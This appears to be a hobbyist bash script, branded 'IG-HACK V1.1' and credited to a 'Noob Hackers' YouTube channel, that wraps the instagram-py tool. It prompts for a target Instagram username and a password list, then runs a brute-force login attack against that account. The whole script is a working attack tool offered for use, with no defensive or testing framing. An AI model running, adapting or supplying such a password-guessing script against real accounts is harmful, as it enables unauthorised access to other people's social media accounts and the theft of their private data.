#wordlist selection
grn='\033[1;32m'
red='\033[1;31m'
rset='\033[0m'
ylo='\033[1;33m'
#!/bin/bash
#coding section starts :)
clear
echo
echo '
    ██╗ ██████╗       ██╗  ██╗ █████╗  ██████╗██╗  ██╗
    ██║██╔════╝       ██║  ██║██╔══██╗██╔════╝██║ ██╔╝
    ██║██║  ███╗█████╗███████║███████║██║V1.1 █████╔╝
    ██║██║   ██║╚════╝██╔══██║██╔══██║██║     ██╔═██╗
    ██║╚██████╔╝      ██║  ██║██║  ██║╚██████╗██║  ██╗
    ╚═╝ ╚═════╝       ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝
              [#] Manual Password Attack [#]
' |lolcat
printf "\n"
printf "                \e[101m\e[1;77m  >>  Script By N17R0 << \e[0m\n"
printf "\n"
printf "       \e[100m\e[1;77m >>  Youtube Channel : \e[1;96m Noob Hackers \e[100m\e[1;77m << \e[0m\n"
printf "\n"
echo
read -p "[#] User Name : " usrnm
echo
read -p "[#] Enter Passlist Location : " inspass
echo
if [[ $inspass = 0 ]]                                             
then
echo -e  "$ylo >>> exiting........! Bye Bye :) <<<$rset"        
else
instagram-py --username $usrnm --password-list $inspass
echo
cd $HOME
fi
cd $HOME/ighack
bash ighack.sh